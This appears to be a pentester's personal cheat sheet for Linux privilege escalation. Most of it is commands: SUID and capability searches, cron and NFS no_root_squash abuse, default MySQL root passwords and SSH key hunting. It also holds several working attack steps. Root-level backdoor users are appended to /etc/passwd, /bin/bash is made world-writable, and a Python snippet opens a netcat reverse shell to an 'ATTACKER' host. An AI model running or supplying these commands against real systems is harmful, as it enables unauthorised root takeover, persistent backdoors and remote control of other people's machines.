
**What Arch?**
```
file /bin/bash
```

**Are we a _real user_?**
```
sudo -l
```

**Are any users a member of exotic groups?**
```
groups <user>
```

**Check out your shell's environment variables...**
```
env
```

**_Users_?**
```
cd /home/
```

**_Web Configs_ containing credentials?**
```
cd /var/www/html/
```

**_SUID_ Binaries?**
```
find / -perm -u=s -type f 2>/dev/null
```

**_GUID_ Binaries?**
```
find / -perm -g=s -type f 2>/dev/null
```

**SUID/GUID/SUDO Escalation:**
https://gtfobins.github.io/

**Capabilities:** 
```
getcap -r / 2>/dev/null
```

**We need to start monitoring the system if possible while performing our enumeration**
```
cd /var/tmp/  
File Transfer **-->** pspy32  
File Transfer **-->** pspy64  
chmod 755 pspy32 pspy64  
./pspy<32/64>
```

**What does the local network look like?**
```
netstat -antup
```

```
ss -tulna
```

**Is anything vulnerable running as root?**
```
ps aux |grep -i 'root' --color=auto
```

**MYSQL Credentials? Root Unauthorized Access?**
```
mysql -uroot -p
Enter Password:
root : root
root : toor
root :
```

**S1REN would take a quick look at etc to see if any user-level people did special things:**
```
cd /etc/
ls -lsaht
Anything other than root here?
• Any config files left behind?
→ ls -lsaht |grep -i ‘.conf’ --color=auto
```

**If we have root priv information disclosure - are there any .secret in /etc/ files?**
```
ls -lsaht /etc/ |grep -i ‘.secret’ --color=auto
```

**SSH Keys I can use perhaps for even further compromise?**
```
ls -lsaR /home/
```

**Quick look in:**
```
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```

**NFS? Can we exploit weak NFS Permissions?**
```
cat /etc/exports
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/

[On Attacking Machine]
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>

[On Target Machine]
user@host$ ./suid
#
```

**_Where can I live on this machine?_ Where can I read, write and execute files?**
```
/var/tmp/
/tmp/
/dev/shm
```

**Any exotic file system mounts/extended attributes?**
```
cat /etc/fstab
```
```
df -h
```

**Can we write as a low-privileged user to /etc/passwd?**
```
openssl passwd -1  
i<3hacking  
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.  
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd  
su siren  
id
```

**Is sudo vulnerable ->**
```
sudo -V
```

**Cron.**
```
crontab –u root –l
```

**Look for unusual system-wide cron jobs:**
```
cat /etc/crontab
```

```
ls /etc/cron.*
```

```
crontab -l
```

**Bob is a user on this machine. What is every single file he has ever created?**
```
find / -user bob 2>/dev/null
```

**Any mail?** **mbox in User $HOME directory?**
```
cd /var/mail/
```

**Compilation? (Very Back Burner):**
```
file /bin/bash
```

```
uname -a
```

```
cat /etc/*-release 
```

```
cat /etc/issue
```

**Linpease**:  
[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**Traitor:**  
[https://github.com](https://github.com/liamg/traitor)[/](https://github.com/liamg/traitor)[liamg/traitor](https://github.com/liamg/traitor)

**GTFOBins:**  
[https://gtfobins.github.io/](https://gtfobins.github.io/)

**PSpy32/Pspy64:**  
[https://github.com/DominicBreuker/pspy/blob/master/README.md](https://github.com/DominicBreuker/pspy/blob/master/README.md)

LinPeas - https://github.com/carlospolop/PEASS-ng/releases/tag/20240310-532aceca


**$ find / -perm -2 -type f 2>/dev/null –** prints world writable files

/sys/kernel/security/apparmor/.remove
/sys/kernel/security/apparmor/.replace
/sys/kernel/security/apparmor/.load
/sys/kernel/security/apparmor/.access

Python 2.7 verify=false
![[IMG_4503.png]]

Katana - sql injection 

```python
import os

os.system('chmod 777 /bin/bash')
os.system('/usr/bin/nc ATTACKER 8003 -e /bin/bash')
```

To append to the /etc/passwd ->
```
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

```
su root2
```
password = 123

https://github.com/mzet-/linux-exploit-suggester

To escape a restricted shell ->
```
ssh -o StrictHostKeyChecking=no -i id_rsa tom@$IP -p 22 -t "bash --noprofile"
```



